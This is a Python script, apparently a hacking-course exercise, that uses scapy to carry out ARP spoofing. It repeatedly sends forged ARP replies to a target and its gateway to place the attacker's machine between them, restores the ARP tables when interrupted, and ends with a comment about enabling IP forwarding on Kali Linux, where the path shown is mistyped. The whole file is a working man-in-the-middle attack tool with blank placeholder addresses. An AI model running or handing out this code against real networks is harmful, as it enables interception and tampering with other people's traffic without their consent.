
import scapy.all as scapy
import time
import sys

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1)[0]

	return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):

	target_mac = get_mac(target_ip)

	"""
	Scapy Usage Info:
	op 1 = ARP Request
	op 2 = ARP Response
	pdst = IP of target
	hwdst = MAC of target
	psrc = IP of router
	"""

	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

	#To preview packet before continuing
	#print(packet.show())
	#print(packet.summary())

	scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

	#To preview packet before continuing
	#print(packet.show())
	#print(packet.summary())

	scapy.send(packet, count=4, verbose=False)

target_ip = ""
gateway_ip = ""

sent_packets_count = 0
try:
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		sent_packets_count += 2
		print("\r[+] Packets sent: " + str(sent_packets_count)),
		sys.stdout.flush()
		time.sleep(2)
except KeyboardInterrupt:
	print("[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)
	print("[+] ARP tables restored.")
"""
"echo 1 > /proc/sys/netipv4/ip_forward"
Opens up Kali to forward traffic on behalf of target
"""
